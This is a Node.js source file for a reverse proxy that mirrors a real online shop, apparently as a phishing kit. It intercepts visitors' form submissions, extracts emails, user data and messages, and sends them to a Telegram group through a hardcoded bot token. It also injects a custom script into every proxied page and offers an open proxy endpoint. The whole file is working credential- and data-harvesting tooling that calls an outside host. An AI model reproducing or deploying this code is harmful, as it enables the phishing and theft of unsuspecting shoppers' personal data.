const express = require("express");
const { createProxyMiddleware, responseInterceptor } = require("http-proxy-middleware");
const cheerio = require("cheerio");
const bodyParser = require("body-parser");
const axios = require("axios");
const { SocksProxyAgent } = require("socks-proxy-agent");
const path = require("path");

const socksAgent = new SocksProxyAgent("socks5h://96.9.124.114:40001");

// TELEGRAM CONFIG
const telegramGroupId = -4769673326;
const botToken = "6272866263:AAGSnWHXlP_4m_Db5T2gLLAw6jjJC0Inrik";
const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

const injectedScript = "<script>console.log('hello we here')</script>";
const target = process.env.TARGET || "https://www.plushpaws.co.uk";
const port = process.env.PORT || 4000;

const proxyMiddleware = createProxyMiddleware({
    target,
    selfHandleResponse: true,
    changeOrigin: true,
    autoRewrite: true,
    followRedirects: true,
    // agent: socksAgent,
    on: {
        proxyReq: (proxyReq, req, res) => {
            console.log("intercepted request");
            if (req.method === "deez") {
                console.log(req.body);
                
                if (req.body) {
                    let content = req.body.toString("utf-8");
                    let parsed = JSON.parse(content);
                    let submittedData = JSON.parse(parsed.components[0]?.snapshot);
                    
                    console.log("+ submitted data", submittedData);

                    if (submittedData?.data?.placeholder) {
                        let userData = submittedData?.data?.data;
                        let formText = parsed.components[0]?.updates["data.message"];
                        console.log("+ user data", userData, { formText });

                        if (userData && userData?.[0]?.email) {
                            let message = `
[Traktor Pool Proxy]\n
UserDataJSON: ${JSON.stringify(userData[0])}    
FormDataUTF-8: ${formText}
Product: ${target}${submittedData?.memo?.path}
Machine ID: ${submittedData?.data?.machineId}
${new Date().toLocaleDateString()}
`;

                            axios.post(url, {
                                chat_id: telegramGroupId,
                                text: message,
                            });
                        }
                    }
                    
                    let modifiedBuffer = Buffer.from(content);
                    proxyReq.write(modifiedBuffer);
                    proxyReq.end();
                }
            }
        },
        proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
            let response = responseBuffer.toString("utf8");

            if (proxyRes.headers["content-type"] && proxyRes.headers["content-type"].includes("text/html")) {
                const $ = cheerio.load(response);
                
                $('a').each((i, el) => {
                    let href = $(el).attr('href');
                    if (href && href.startsWith(target)) {
                        href = href.split(target)[1];
                        $(el).attr('href', href);
                    }
                });

                $('img').each((i, el) => {
                    let src = $(el).attr('src');
                    if (src && src.startsWith('/')) {
                        $(el).attr('src', `${target}${src}`);
                    }
                });

                $('body').append(`<script defer src="/ourassets/overwrite.js"></script>`);
                response = $.html();
            }
            return response;
        }),
    },
});

const app = express();

app.use(bodyParser.raw({ type: "*/*" }));
app.use(bodyParser.urlencoded({ extended: true }));

app.post("/submit-form", (req, res) => {
    let body = Buffer.from(req.body).toString("utf-8");
    console.log(body);
    axios.post(url, {
        chat_id: telegramGroupId,
        text: `[traktorpool proxy number submission]\n${decodeURI(body)}`,
    });

    return res.sendFile(path.resolve(__dirname, "submit.html"));
});

app.use("/ourassets", express.static(path.resolve(__dirname, "custom")));

app.use("/proxy", (req, res, next) => {
    let target = req.query.url;
    target = decodeURI(target);
    console.log({ target });

    createProxyMiddleware({
        target: target,
        changeOrigin: true,
        followRedirects: true,
    })(req, res, next);
});

app.use("/", proxyMiddleware);

app.listen(port, () => {
    console.warn("running on port 4000");
});

